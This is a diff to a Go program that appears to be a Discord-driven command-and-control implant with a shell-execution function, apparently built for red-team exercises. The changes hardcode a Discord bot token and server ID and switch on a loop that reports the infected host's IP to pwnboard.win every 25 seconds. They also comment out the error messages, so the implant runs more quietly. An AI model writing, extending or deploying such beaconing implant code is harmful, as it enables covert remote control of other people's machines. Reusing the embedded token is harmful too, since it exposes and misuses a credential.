@@ -12,7 +12,7 @@ import (
 	"strings"
 	"time"
 	"encoding/json"
-	"gopkg.in/yaml.v3"
+	// "gopkg.in/yaml.v3"
 	"github.com/andersfylling/disgord"
 	creator "./discord"
 )
@@ -118,7 +118,7 @@ func shellRun(cmd string) string{
 func updatepwnBoard(ip string){
 	for {
 
-		time.Sleep(7 * time.Second)
+		time.Sleep(25 * time.Second)
 
 		url := "http://pwnboard.win/generic"
 		// url := "http://localhost:8080"
@@ -132,14 +132,14 @@ func updatepwnBoard(ip string){
     	// Marshal the data
     	sendit, err := json.Marshal(data)
     	if err != nil {
-        	fmt.Println("\n[-] ERROR SENDING POST:", err)
+        	//fmt.Println("\n[-] ERROR SENDING POST:", err)
         	return
     	}
 
     	// Send the post to pwnboard
     	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
     	if err != nil {
-        	fmt.Println("[-] ERROR SENDING POST:", err)
+        	//fmt.Println("[-] ERROR SENDING POST:", err)
         	return
     	}
 
@@ -179,31 +179,40 @@ func prettyOutput(out string) string {
 // Also updates pwnboard every 7 seconds because why not
 func main(){
 	// Config file
-	f, err := os.Open("config.yaml")
-	if err != nil {
-		processError(err)
-	}
-	defer f.Close()
 
-	var config Config
-	decoder := yaml.NewDecoder(f)
-	err = decoder.Decode(&config)
-	if err != nil {
-	    processError(err)
-	}
+	token := "NzAyODc0Mzc5ODI2MjMzNDY0.XqJdpw.0kDsBSL0GmrX4PL6cJgXHltwTEc"
+	server := 702873874127388772
+	categoryname := "web"
+  	channelname := "web-team"
+	// f, err := os.Open("config.yaml")
+	// if err != nil {
+	// 	processError(err)
+	// }
+	// defer f.Close()
+
+	// var config Config
+	// decoder := yaml.NewDecoder(f)
+	// err = decoder.Decode(&config)
+	// if err != nil {
+	//     processError(err)
+	// }
+
+	// client := disgord.New(disgord.Config{
+	// 	BotToken: config.Discord.Token,
+	// })
 
 	client := disgord.New(disgord.Config{
-		BotToken: config.Discord.Token,
+		BotToken: token,
 	})
 
 	glocli = client
 
-	id := config.Discord.ID
-	categoryName := config.Channel.OS
-	channelName := config.Channel.TeamNum
+	id := server
+	categoryName := categoryname
+	channelName := channelname
 
 	// Pwnboard test
-	// go updatepwnBoard(getIP()) <-----------------------Pwnboard stuff
+	go updatepwnBoard(getIP()) // <-----------------------Pwnboard stuff
 
 	defer client.StayConnectedUntilInterrupted(con)
 
